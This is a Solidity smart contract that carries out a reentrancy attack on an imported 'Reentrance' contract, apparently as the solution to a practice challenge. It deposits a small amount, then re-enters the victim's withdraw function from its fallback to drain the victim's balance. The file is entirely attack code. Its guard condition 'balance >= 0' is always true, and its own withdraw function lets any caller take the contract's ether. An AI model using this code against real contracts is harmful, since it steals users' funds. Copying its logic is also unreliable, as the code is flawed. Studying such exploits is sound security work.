// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

import "./Reentrancy.sol";

contract ReentranceAttack {

    // @info Inital deposit
    uint public constant initalDeposit = 0.001 ether;

    // @info Create an Instance of the victim contract
    Reentrance reentrancy;

    constructor(Reentrance _reentrancy) {
        reentrancy = Reentrance (_reentrancy);
    }

    // @info The fallback function will be invoked, each time we withdraw the funds from the victim contracts
    fallback() external payable {
        if(address(reentrancy).balance >= 0) {
            reentrancy.withdraw(initalDeposit);
        }
    }


    // @info I need to create a function, will deposit ether and withdraw it in the same time
    function attack() external payable {    
        // Deposit Eth and withdraw it at the same to invoke the fallback function
        reentrancy.donate{value : initalDeposit}(address(this));
        reentrancy.withdraw(initalDeposit);
    }

    // @info Helper function to get the balance of the smart contract
    function getBalance() public view returns(uint) {
        return address(this).balance;
    }


    function withdraw() external payable {
        uint bal = address(this).balance;
        require(bal >= 0, "msg.value is >=0");
        (bool success, ) = msg.sender.call{value : bal}("");
        require(success, "trx failed");
    }
  
}


